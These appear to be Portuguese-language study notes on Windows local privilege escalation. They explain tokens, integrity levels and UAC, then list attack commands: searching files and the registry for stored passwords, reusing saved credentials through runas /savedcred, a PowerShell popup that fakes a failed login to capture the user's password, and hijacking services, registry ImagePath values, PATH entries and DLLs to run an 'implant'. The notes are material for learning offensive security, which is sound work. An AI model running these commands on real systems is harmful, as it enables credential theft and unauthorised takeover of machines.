# Windows LPE notes...

```
- Pri-esc base:
  1. Pegar SYSTEM perm
  2. Assumir outro usuário
  3. Mudar integrity levels
  4. Tirar proveito de tokens
  5. Ganhar mais privilégios  
```

- De um lado temos os resources do sistema como arquivos, diretórios ou registries. E ous outros são usuários/process que desejam utilizar esses recursos...

- Entre resouces e process temos a divisão do sistema em que os process podem acessar qual recurso ... 
Como o acesso aos recursos é concedido ou negado ??
Então quando um resource possui o ```SECURITY DESCRIPTOR``` que é composto por ```OWNER```, ```GROUP``` e ```ACLs``` que descrevem quem pode ou não acessar os resources.
Por outro lado, os process usam tokens de acesso que são objects dedicados que descrevem a identidade do usuário. E o ```SECURITY REFERENCE MONITOR``` no Kernel verifica até mesmo a call de um process específico para um acesso específico é permitida ou não.
Primeiro é verificado o ```INTEGRITY LEVEL``` depois é verificado o OWNER e a ACL do resource.


- O process e os threads herdam um token dos parent process. Os Tokens de Acesso são a base de todas as autorizações ou "decisões" no sistema, concedidas ao usuário autorizado pelo LASS. Cada token de acesso inclui o ```CID``` dos usuários.
 - ```Primary Tokens``` = default security information of process or thread.
 - ```Impersonation Tokens``` = permite realizar operações utilizando token de acesso de outro usuário.

- ```PRIVILEGIES``` e ```ACCESS RIGHTS``` tem duas diferenças principais: Privilegies controlam o acesso a tarefas relacionadas ao sistema e Access Rights controlam o acesso a objects.
A segunda diferença é que os Privilegies são atribuídos a contas de usuário/grupo e os Access Rights atribuídos a ACLs de objetos.

```
- Privilegies:
  - Atribuido a users e groups
  - operações no sistema:
    - instalar/carregar drives
    - shutdown
    - mudar timezone


- Access Rights:
  - Atrbuido a Objects ACL
  - Acessar Objects protegidos:
    - arquivos/pastas, registry keys, services, network shares, access tokens...
```

- O ```User Access control``` (UAC) é um componente fundamental da visão geral de segurança da MS. O UAC ajuda a mitigar o impacto de malwares.

Cada aplicativo que requer o administrator access token deve solicitar-lo. A única exceção é o relacionamento que existe entre ```parent processes```. Os ```Child Processes``` herdam o acess token do ```parent process```. Entretanto, os parents e child process devem ter o mesmo ```Integrity Level```. 
O Windows protege processes marcando seus integrity levels. Os Integrity Levels são medidas de confiança. Um programa integrity “alta” é aquele que executa tarefas que modificam dados do sistema, como um programa de particionamento de disco, enquanto um programa de integrity “baixa” é aquele que executa tarefas que podem comprometer o sistema operacional, como um navegador da Web. 
Programas com integrity level mais baixos não podem modificar dados em programas com integrity levels mais altos. 
Quando um usuário padrão tenta executar um programa que requer um access token de administrator, o UAC exige que o usuário forneça credenciais de administrador válidas.

fonte:
https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview


- Integrity Level
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels

- Filtered Admin Token or Restricted Access Token
  - https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
  - https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens

- Permissões "perigosas"?
  - ```SeBackupPriv``` - read qualquer arquivo
  - ```SeRestorePriv``` - write em qualquer arquivo
  - ```SeTakeOwnershipPriv``` - se tornar owner
  - ```SeTcbPriv``` - se tornar parte do TCB
  - ```SeLoadDriverPriv``` - load/unload drivers
  - ```SeCreateTokenPriv``` - criar primary token
  - ```SeImpersonatePriv``` - se tornar outro user
  - ```SeDebugPriv``` - acessar a memória de qualquer process


#### READ/REFS

- https://www.pwndefend.com/2021/08/18/windows-security-fundamentals-lpe/
- https://dmfrsecurity.com/2021/05/16/review-red-team-operator-privilege-escalation-in-windows-course-by-sektor7-institute/
- https://xz.aliyun.com/t/3618

>___


# Gathering Creds

## Procurando senhas em plaintext

- lista todos os diretorios a partir do c:\
- ``` C:\> dir /b /a /s c:\ > output.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Filtra por arquivos com nome "passw"
- ``` C:\> type output.txt | findstr /i passw ```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples


## Nomes e Extenções de arquivos interessantes para verificar

- Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc,
ftp, ssh, vpn, git, .kdbx, .db

- Arquivos: unattend.xml, Unattended.xml, sysprep.inf, sysprep.xml, VARIABLES.DAT, setupinfo, setupinfo.bak, web.config, SiteList.xml, .aws\credentials, .azure\accessTokens,json, .azure\azureProfile.json, gcloud\credentials.db, gcloud\legacy_credentials, gcloud\access_tokens.db

- ``` C:\> type output.txt | findstr /i algumas extenção ```



## Arquivos nos Registries 

- ``` reg query "HKCU\Software\ORL\WinVNC3\Passowrd" ```
 
- ``` reg query "HKCU\Software\TightVNC\Server" ```

- ``` reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" ```

- ``` reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\local" ```


- ``` reg query HKLM /f password /c REG_SZ /s ```

- ``` reg query HKLM /f password /c REG_SZ /s ```



## Abusing Credential Manager

- Credential Manager
  - O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas...

- Do ponto de vista do invasor, geralmente você não tem acesso a uma GUI... Então você usa a linha de comando. Na linha de comando existe uma ferramenta chamada "cmdkey".

  - O cmdkey também permite listar essas informações.
    - ``` C:\> cmdkey /list ```

- We can access actualy the Admin home directory and run processes as Admin:
  - ``` C:\> runas /user:admin cmd.exe``` <===== precisa de admin pass

  - ``` C:\> runas /savedcred /user:admin cmd.exe ```
    - windows vai até Credential Manager, verifica o usuário admin (consulta o banco de dados), extrai a senha do usuário admin e executa o processo. (execute como administrador com integrity level medium)

- Podemos listar todos os diretórios aos quais não temos acesso.
  - ``` C:\> runas /savedcred /user:admin "c:\windows\system32\cmd.exe /c dir /b /a /s c:\users\admin > c:\output-admin.txt" ```
    - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Também podemos usar esse comando para rodar um implant:
  - ``` C:\> runas /savedcred /user:admin "c:\path\to\implant.exe" ```



## Extraindo creds do Credential Manager

- Script from Empire...

- C:\> powershell import-module c:\path\to\cms.ps1 ; Enum-Creds



## Popup local para pegar as creds de um user

- Cria um popup que pede a senha do usuário atual

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::Username,[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```

>___


# Insecured Objects (Non Admin Medium IL)

## Insecured Services

### Priv Esc usando insecured objects, especificamente abusando dos Windows Services.

#### A primeira tecnica é chamada ```Insecure Service Path``` (unquoted and with spaces in paths):

- Ache services com espaços no binary path
- ``` C:\> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ ```


- Exploration
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths
  - https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths


#### A segunda tecnica é chamada de ```insecure config services``` ou ```weak services permission```

- Permite um usuário com poucos privilégios ter permissão para alterar a configuração de um service. Por exemplo, alterar o binário que um service usa quando inicia...

- Isso mostrará uma lista de cada service e os grupos que têm permissões de gravação para esse service. Fornecer um grupo limitará a saída aos serviços para os quais o grupo tem permissão de gravação:

- ``` C:\> accesschk.exe -accepteula -wuvc "Authenticated Users" * ```
- ``` C:\> accesschk.exe -accepteula -wuvc "Users" * ```
- ``` C:\> accesschk.exe -accepteula -wuvc "Everyone" * ```

- Para ver as configs do service:
- ``` C:\> sc query <service-name> ``` - lista services
- ``` C:\> sc qc <service-name> ``` - info do service


- Alterar a config e restart no service (se precisar)
- ``` sc config sshd binPath= "c:\implant\implant.exe" ```
- ``` sc start <service-name> ```

- Exploration
  - https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/
  - https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions
  - https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions


#### A terceira tecnica é modificar permissões dos Registries (weak registry permissions)

- Lista dos services
- ``` C:\> accesschk.exe -accepteula -kwuqsw hklm\System\CurrentControlSet\services > output.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- reconfigurando services vulneraveis:

- Ver os paths do binarios:
- ``` reg query HKLM\SYSTEM\CurrentControlSet\services\ /s /v imagepath ```

- ``` reg add HKLM\SYSTEM\CurrentControlSet\services\<service-name> /v ImagePath /t REG_EXPAND_SZ /d C:\implant\implant.exe /f ```


- Exploration
  - https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Privilege%20Escalation/Windows/Misconfigured%20Services/Weak%20Registry%20Permissions.html
  - https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions
  - https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/


>___


## # Execution Flow Hijacking

> #### Unsecured File System

- Busca em todo o disk C:\ por arquivos com perms read/write no grupo Users e Authenticated Users 
- ``` accesschk.exe -accepteula -wus "Users" c:\*.* > output.txt ```
- ``` accesschk.exe -accepteula -wus "Authenticated Users" c:\*.* > auth-usr.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offiline"

- Basicamente, procurando por paths de executaveis com perms read/write, a ideia é usar a tecnica de Execution Flow Hijacking [https://attack.mitre.org/techniques/T1574/007/](https://attack.mitre.org/techniques/T1574/007/) para substituir um binario legitimo pelo implant. Fazendo com que o implant, quando executado, "chame" o binario legitimo depois de executar o payload em um processo diferente...

demo em breve???...

READ/REFS:
  - https://helgeklein.com/blog/finding-executables-in-user-writeable-directories/  


> #### Explorando Env Vars paths (Path Interception by PATH Environment Variable)

- Vendo as env vars
- ``` reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" ``` ou ```set```


- Checando perm de write no env PATH
- ```icacls c:\rto\bin```

- Se houver um caminho controlável nesta lista colocado, você poderá fazer com que o sistema execute seus próprios binários em vez dos reais.
- ``` copy c:\implant\implant.exe c:\bin\notepad.exe ```

READ/REFS:
- [https://attack.mitre.org/techniques/T1574/007/](https://attack.mitre.org/techniques/T1574/007/)


> #### Explorando Services sem o binario no path

- Buscando por services sem binario
- ``` c:\autorunsc64.exe -a s | more ```

- Info do service
- ``` C:\> sc query <service-name> ``` - lista services
- ``` C:\> sc qc <service-name> ``` - info do service


- Substituindo o binario
- ``` copy c:implant\implantsrv.exe c:\path-to-service-sem-bin ```

- restart no service:

- ``` sc stop <service-name> sc start <service-name> ```


> #### Explorando Task sem binario no path 

A ideia é a mesma do Service sem binario...

- Buscando por Tasks sem bin:
- ``` c:\autorunsc64.exe -a s | more ```


- Checando configs da Task:
- ``` schtasks /query /tn <task-name> /xml ```

Nas configs procure pelo ```<UserId>``` (CID) para verificar a qual user pertence a task. Olhe também as configs ```<LogonType>``` e ```<RunLevel>``` para mais info do user daquela task.
Por ultimo, verifique a config ```<Triggers>``` que diz como aquela task é iniciada e com isso voĉe saberá como inicia-la.


- Substituindo binario:
- ``` copy c:implant\implant.exe C:\path-to-service-sem-bin ```

- Checando username do UserId (CID)
- ````wmic useraccount where sid='S-1-5-21-3461203602-4096304019-2269080069-1003' get name ```


READ/REFS:
- https://amr-git-dot.github.io/offensive/Priv-esc/
- https://gitbook.brainyou.stream/basic-windows/tcm-win-privesc#insecure-folders-files


> #### DLL Hijacking (for priv-esc)

O DLL Hijacking envolve a manipulação de um programa confiável para carregar uma DLL maliciosa. Existem varias táticas como DLL Spoofing, Injection e Side-Loading. É utilizado principalmente para execução de código, persistência e, menos comumente, priv-esc. 
E nesse caso aqui será para priv-esc...

- Encontre em programa com DLL's marcadas como NOT FOUND

- Ache uma DLL para hijack

- Depois procure pelas funções especificas que o programa tenta importar da DLL not found:
  - dump da import table
  - ```c:\ dumpbin imports c:\path_to_target_program```

- Sabendo as funções que um programa tenta importar você pode pesquisar pelo implementação dessa DLL e tentar hijack...

```
Sim, os requisitos são complicados de encontrar, pois por padrão é meio estranho encontrar um executável privilegiado sem uma dll e é ainda mais estranho ter permissões de gravação em uma pasta do caminho do sistema (você não pode por padrão). Mas, em ambientes mal configurados isso é possível.
```

READ/REFS:
- https://akimbocore.com/article/privilege-escalation-dll-hijacking/
- https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#escalating-privileges
- https://steflan-security.com/windows-privilege-escalation-dll-hijacking/



> #### UAC

- https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
- https://github.com/hfiref0x/UACME